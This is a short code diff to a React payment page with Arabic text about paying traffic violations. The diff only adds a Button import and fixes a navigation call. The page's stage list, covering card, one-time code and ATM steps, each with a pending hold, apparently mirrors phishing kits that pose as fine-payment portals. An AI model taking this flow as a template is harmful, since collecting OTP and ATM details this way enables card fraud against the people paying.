@@ -3,6 +3,7 @@ import { useLocation } from "wouter";
 import { trpc } from "@/lib/trpc";
 import { useLanguage } from "@/contexts/LanguageContext";
 import { Phone, Lock, CreditCard, ShieldCheck, CheckCircle2, XCircle, Loader2, ArrowRight } from "lucide-react";
+import { Button } from "@/components/ui/button";
 
 type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";
 
@@ -339,7 +340,7 @@ export default function Payment() {
                 <h3 className="text-3xl font-bold text-gray-800 mb-4">تمت عملية الدفع بنجاح!</h3>
                 <p className="text-gray-600 mb-10 text-lg">شكراً لك، تم استلام دفعتك وتحديث سجل المخالفات.</p>
                 <Button
-                  onClick={() => navigate("/")}
+                  onClick={() => setLocation("/")}
                   className="bg-[#003366] text-white py-6 px-12 text-lg font-bold rounded"
                 >
                   العودة للرئيسية
